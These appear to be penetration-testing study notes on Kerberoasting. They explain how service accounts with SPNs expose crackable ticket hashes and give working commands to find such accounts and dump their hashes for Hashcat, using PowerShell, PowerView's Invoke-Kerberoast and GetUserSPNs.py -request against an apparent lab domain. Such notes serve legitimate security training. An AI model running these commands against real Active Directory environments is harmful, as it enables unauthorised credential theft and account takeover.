## What is it ?
`Kerberoasting` is an attack against service accounts that allows an attacker to perform an offline password-cracking attack against the Active Directory account associated with the service. It is similar to `ASREPRoasting` but does require prior authentication to the domain. In other words, we need a valid domain user account and password (even the lowest privileged) or a SYSTEM (or low privileged domain account) shell on a domain-joined machine to perform the attack.

The `TGS` ticket is encrypted using computer, user or `gMSA` "special user account" account. we are interested in SPN that is associated with user accounts. A user account has a password set by a human, which is much more likely to be predictable. on the other hand, computer accounts have big passwords of characters and the `gMSA` also do so, and `gMSA`automaticly rotate passwords.

---
### Kerberoasting without an Account Password
When we have random user in AD has pre-auth disabled, we can request his `TGT`, then we can use this `TGT` to get `TGS` for different services in the env, that enhance our attack surface, so we may be able to crack one of the service accounts.

---
## Commands
### windows
#### Manual Detection
We then look for user accounts (not machine accounts) exposing a service. An account that exposes a service has a Service Principal Name (or SPN). It is an LDAP attribute set on the account indicating the list of existing services provided by this account. If this attribute is not empty, this account offers at least one service.

Here is an LDAP filter to search for users exposing a service:
```ldap
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```

This filter returns a list of users with a non-empty SPN. A small PowerShell script allows us to automate finding these accounts in an environment:
```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results) { $userEntry = $result.GetDirectoryEntry()
    Write-host "User" 
    Write-Host "===="
    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
        Write-host ""
    Write-host "SPNs"
    Write-Host "===="     
    foreach($SPN in $userEntry.servicePrincipalName)
    {
        $SPN       
    }
    Write-host ""
    Write-host ""
}
```
This script allows us to have a list of Kerberoastable accounts, but it does not perform a TGS request and does not extract the hash we can brute force.
We can also use the [Setspn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) built-in Windows binary to search for SPN accounts.

#### Kerberoasting with PowerView
```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Invoke-Kerberoast
# OR Manually
PS C:\Tools> Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
PS C:\Tools> cat .\tgs.csv
```
#### Kerberoasting with Rubeus
[[Rubeus]]

---
### Linux

`GetUserSPNs.py` This tool can search for all Kerberoastable accounts, extract the data encrypted with the password of the service account, and return a hashcat-friendly hash for further cracking.
```sh
GetUserSPNs.py inlanefreight.local/pixis
```

Now that we know there are `Kerberoastable` accounts, we can request a `TGS ticket` or `Service Ticket (ST)` for each of them and obtain a crackable hash using `-request`
```
GetUserSPNs.py inlanefreight.local/pixis -request
```